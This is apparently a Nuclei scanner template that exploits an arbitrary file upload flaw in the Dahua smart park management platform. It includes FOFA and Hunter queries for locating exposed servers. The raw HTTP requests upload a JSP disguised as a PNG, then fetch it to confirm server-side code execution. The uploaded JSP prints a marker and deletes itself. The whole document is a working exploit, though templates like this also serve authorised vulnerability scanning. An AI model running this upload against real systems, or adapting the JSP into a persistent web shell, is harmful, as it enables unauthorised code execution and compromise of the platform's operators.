id: dahua-wpms-devicePoint-addImgIco-fileupload

info:
  name: 大华智慧园区综合管理平台 /emap/devicePoint_addImgIco - 任意文件上传
  author: leadlife
  severity: critical
  description: 
  reference:
    - todo
  metadata:
    verified: false
    fofa-qeury: app="dahua-智慧园区综合管理平台"
    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
  tags: dahua,fileupload,wpms

variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxoetulhc
        Content-Length: 271

        ------WebKitFormBoundaryxoetulhc
        Content-Disposition: form-data; name="upload"; filename="{{random_str}}.jsp"
        Content-Type: image/png

        <%out.print("{{match_str}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundaryxoetulhc--
      
      - |
        GET /upload/emap/society_new/{{shell_filename}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: shell_filename
        internal: true
        part: body_1
        regex:
          - 'ico_res_(\w+)_on\.jsp'

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && status_code_2 == 200'
          - 'contains(body_2,"{{match_str}}")'
        condition: and
